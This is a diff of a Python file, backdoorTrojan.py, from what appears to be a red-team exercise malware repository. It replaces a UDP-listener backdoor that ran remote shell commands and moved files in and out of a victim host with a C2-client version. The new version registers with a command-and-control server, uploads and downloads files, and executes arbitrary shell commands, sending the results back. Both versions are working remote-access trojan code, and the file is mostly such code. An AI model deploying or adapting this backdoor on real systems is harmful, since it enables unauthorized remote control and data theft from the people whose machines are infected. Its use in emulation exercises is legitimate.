@@ -1,159 +1,146 @@
-#!/usr/bin/python
 #-----------------------------------------------------------------------------
 # Name:        backdoorTrojan.py
 #
-# Purpose:     This module is used to simulate a trojan to open a backdoor to a
-#              allow hacker to remote run command on a host without authorize. 
+# Purpose:     This module is a C2 backdoor Trojan (hook with the C2-client) example 
+#              with a Modbus I/O lib plug in to run the victim to carry out the
+#              cyber attack action includes : run command, tranferfile, launch 
+#              false data injection.
 #
 # Author:      Yuancheng Liu
 #
-# Version:     v_0.1
-# Created:     2023/09/21
-# Copyright:   n.a
-# License:     n.a
+# Version:     v_0.1.1
+# Created:     2023/10/19
+# Copyright:   Copyright (c) 2023 LiuYuancheng
+# License:     MIT License
 #-----------------------------------------------------------------------------
+""" Program design: 
+    We want to implement a remote backdoor trojan which can carry other Malicious
+    Action function to build a remote controlable malware which can linked in our 
+    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
+    This program will be used in the testRun attack demo and verfication of the 
+    cyber event : Cross Sward 2023
+"""
 
 import os
+import time
 import subprocess
-import udpCom
+from datetime import datetime
+import c2MwUtils
+import c2Client
 
-UDP_PORT = 3003
-ACT_CODE = 'YCACTTROJAN'
-BUF_SZ = 60000
-
-print("Current working directory is : %s" % os.getcwd())
 dirpath = os.path.dirname(__file__)
-print("Current source code location : %s" % dirpath)
-
-#-----------------------------------------------------------------------------
-def base64Convert(data, b64Encode=True):
-    """ Encode/decode a str to its base-64 string format.
-    Args:
-        messageStr (str): can be either base-64 message or plain text message.
-        b64Encode (bool): whether the input is to be encoded to base-64, default True.
-    Returns:
-        string: base-64 message if b64Encode is True; else plain text message.
-    """
-    import base64
-    if b64Encode:
-        message_bytes = data.encode('ascii')
-        base64_bytes = base64.b64encode(message_bytes)
-        base64_message = base64_bytes.decode('ascii')
-        return base64_message
-    else:
-        base64_bytes = data.encode('ascii')
-        message_bytes = base64.b64decode(base64_bytes)
-        message = message_bytes.decode('ascii')
-        return message
 
 #-----------------------------------------------------------------------------
 #-----------------------------------------------------------------------------
-class backdoorTrojan(object):
+class malwareTest(object):
 
-#-----------------------------------------------------------------------------
-    def __init__(self, port=UDP_PORT, actCode=ACT_CODE) -> None:
-        self.active = False
-        self.actCode = actCode
-        self.server = udpCom.udpServer(None, UDP_PORT)
-        self.server.setBufferSize(bufferSize=BUF_SZ)
+    def __init__(self) -> None:
+        self.malwareID = 'backdoorTrojan2'
+        c2Ipaddr = '127.0.0.1'
+        malownIP = '192.168.50.11'
+        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, ownIP=malownIP)
+        self.taskList = [
+            {
+                'taskID': 0,
+                'taskType': 'register',
+                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'repeat': 1,
+                'ExPerT': 0,
+                'state' : c2MwUtils.TASK_R_FLG,
+                'taskData': None
+            },
+            {
+                'taskID': 1,
+                'taskType': 'upload',
+                'StartT': None,
+                'repeat': 1,
+                'ExPerT': 0,
+                'state' : c2MwUtils.TASK_A_FLG,
+                'taskData': [os.path.join(dirpath, "update_installer.zip")]
+            },
 
-#-----------------------------------------------------------------------------
+            {
+                'taskID': 2,
+                'taskType': 'download',
+                'StartT': None,
+                'repeat': 1,
+                'ExPerT': 0,
+                'state' : c2MwUtils.TASK_A_FLG,
+                'taskData': ['2023-12-13_100327.png','NCL_SGX Service.docx']
+            },
+        ]
+        self.ownRcd = c2MwUtils.mwClientRcd(self.malwareID, malownIP, taskList=self.taskList)
+        self.c2Connector.registerToC2(taskList=self.taskList)
+        self.c2Connector.start()
+        self.terminate = False 
+
+    #-----------------------------------------------------------------------------
     def run(self):
-        print("Start the backdoor trojan simulator...")
-        print("Start the UDP echo server licening port [%s]" % UDP_PORT)
-        self.server.serverStart(handler=self.cmdHandler)
-    
-#-----------------------------------------------------------------------------
-    def _parseIncomeMsg(self, msg):
-        reqKey = reqType = reqData = None
-        try:
-            reqKey, reqType, reqData = msg.split(';', 2)
-            return (reqKey.strip(), reqType.strip(), reqData)
-        except Exception as e:
-            print('The income message format is incorrect.')
-            print(e)
-            return (reqKey, reqType, reqData)
-
-#-----------------------------------------------------------------------------
-    def cmdHandler(self, msg):
-        """ The test handler method passed into the UDP server to handle the 
-            incoming messages.
+        while not self.terminate:
+            # Check whether got new incomming task
+            task = self.c2Connector.getOneC2Task()
+            # sychronized the task record
+            if task is not None:
+                self.ownRcd.addNewTask(task)
+            # do one task
+            for taskDict in self.ownRcd.getTaskList(taskState=c2MwUtils.TASK_A_FLG):
+                idx = taskDict['taskID']
+                resultStr = 'taskfinished'
+                for _ in range(taskDict['repeat']):
+                    if taskDict['taskType'] == 'upload' or taskDict['taskType'] == 'download':
+                        time.sleep(int(taskDict['ExPerT']))
+                        uploadFlg = taskDict['taskType'] == 'upload'
+                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
+                        resultStr = 'File transfered'
+                    elif taskDict['taskType'] == c2MwUtils.CMD_FLG:
+                        cmd = str(taskDict['taskData'][0])
+                        print("Run cmd : %s " %str(cmd))
+                        resultStr= self.runCmd('detail', cmd)
+                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
+                    reportDict ={
+                        'taskID': idx,
+                        'state': c2Client.TASK_F_FLG,
+                        'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                        'taskData': str(resultStr)
+                    }
+                    self.c2Connector.addNewReport(reportDict)
+                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
+                    time.sleep(0.1)
+                
+    #-----------------------------------------------------------------------------
+    def runCmd(self, returnType, cmdStr):
+        """ Run a command and collect the result on the victim host.
+        Args:
+            returnType (str): if == 'detail' return the command execution result, 
+                        else return execution success/fail
+            cmdStr (str):  command string.
         """
-        print("Incomming command: %s" % str(msg))
-        if isinstance(msg, bytes): msg = msg.decode('utf-8')
-        if msg == self.actCode:
-            self.active = True
-            return 'ready'
-        if not self.active: return None
-        result = None
-        reqKey, reqType, data = self._parseIncomeMsg(msg)
-        if reqKey == 'CMD':
-            result = self._runCmd(reqType, data)
-        elif reqKey == 'FIO':
-            result = self._fileIO(reqType, data)
-        else:
-            result = 'Not support action.'
-        return result
-
-#-----------------------------------------------------------------------------
-    def _runCmd(self, returnType, cmdStr):
         if returnType and cmdStr:
             try:
                 result = subprocess.check_output(str(cmdStr), 
                                                 stderr=subprocess.STDOUT, 
                                                 shell=True)
-                return result if returnType == 'detail' else 'done'
+                print(result)
+                return result if returnType == 'detail' else 'success'
             except Exception as err:
                 print("Rum cmd error: %s" %str(err))
-                return 'error'
+                return str(err) if returnType == 'detail' else 'fail'
         else:
             return 'error'
-
-#-----------------------------------------------------------------------------
-    def _fileIO(self, actionType, data):
-        global dirpath
-        if actionType == 'out':
-            filePath = data
-            print("Transfer file out from vicim: %s" %str(filePath))
-            return self._copyFileOut(filePath)
-        else:
-            filename = actionType
-            filedata = data
-            filePath = os.path.join(dirpath, filename)
-            print("Create the file at: %s " %str(filePath))
-            return self._copyFileIn(filePath, filedata)
-
-#-----------------------------------------------------------------------------
-    def _copyFileIn(self, filePath, fileData):
-        fileBytes = bytes.fromhex(fileData)
-        try:
-            with open(filePath, 'wb') as fh:
-                fh.write(fileBytes)
-            return 'done'
-        except Exception as err:
-            print("File creation error: %s" %str(err))
-            return 'error'
-
-#-----------------------------------------------------------------------------
-    def _copyFileOut(self, filePath):
-        fileData = b'error'
-        if os.path.exists(filePath):
-            try:
-                with open(filePath, 'rb') as fh:
-                    fileData = fh.read()
-                dataStr = fileData.hex()
-                return dataStr
-            except Exception as err:
-                print("Rum cmd error: %s" %str(err))
-        print("File not found: %s" %str(filePath))
-        return fileData.hex()
+        
+    def stop(self):
+        self.c2Connector.stop()
 
 #-----------------------------------------------------------------------------
 #-----------------------------------------------------------------------------
-def main(mode):
-    trojan = backdoorTrojan()
-    trojan.run()
+def main():
+    client = malwareTest()
+    time.sleep(1)
+    client.run()
+    for i in range(10):
+        time.sleep(1)
+        print(i)
+    client.stop()
 
-if __name__ == "__main__":
-    main(0)
-
+if __name__ == '__main__':
+    main()
